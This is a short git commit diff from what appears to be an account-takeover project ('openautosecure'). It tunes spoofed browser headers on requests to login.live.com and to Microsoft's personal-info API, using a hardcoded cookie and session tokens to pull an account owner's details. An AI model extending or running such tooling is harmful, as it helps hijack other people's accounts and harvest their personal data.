b4cbb24bd4dcee60a36c38fb345c122387b86956
openautosecure <dragonite68m@gmail.com>
2026-05-08 21:45:22 +0100

    better headers

--- views/utils/checkAuth.py
+++ views/utils/checkAuth.py
@@ -10,7 +10,6 @@ async def checkAuth(flowtoken: str) -> dict:
             headers = {
                 "Content-Type": "application/json",
                 "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                 "Accept": "application/json",
                 "Accept-Language": "en-US,en;q=0.9",
                 "Origin": "https://login.live.com",
--- views/utils/securing/getOwnerInfo.py
+++ views/utils/securing/getOwnerInfo.py
@@ -7,15 +7,21 @@ async def getOwnerInfo(session: httpx.AsyncClient, verificationToken: str):
 
         getInfo = await session.get(
             "https://account.microsoft.com/profile/api/v1/personal-info",
-            headers={
+            headers = {
+                "Host": "account.microsoft.com",
                 "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "en-US,en;q=0.9",
                 "Accept-Encoding": "gzip, deflate, br, zstd",
                 "X-Requested-With": "XMLHttpRequest",
+                "MS-CV": "oPOn6XQzaUytvOxM.14.96",
                 "__RequestVerificationToken": verificationToken,
-                "Correlation-Context": "v=1,ms.b.tel.market=en-US,ms.b.qos.rootOperationName=GLOBAL.PROFILE.PERSONALINFO.GETPERSONALINFO",
+                "Correlation-Context": "v=1,ms.b.tel.market=en-US,ms.b.qos.rootOperationName=GLOBAL.PROFILE.CONTACTINFO.GETCONTACTINFO",
+                "Sec-GPC": "1",
+                "Connection": "keep-alive",
+                "Referer": "https://account.microsoft.com/profile?lang=en-US",
                 "Sec-Fetch-Dest": "empty",
                 "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-origin"
+                "Sec-Fetch-Site": "same-origin",
             }
         )
 
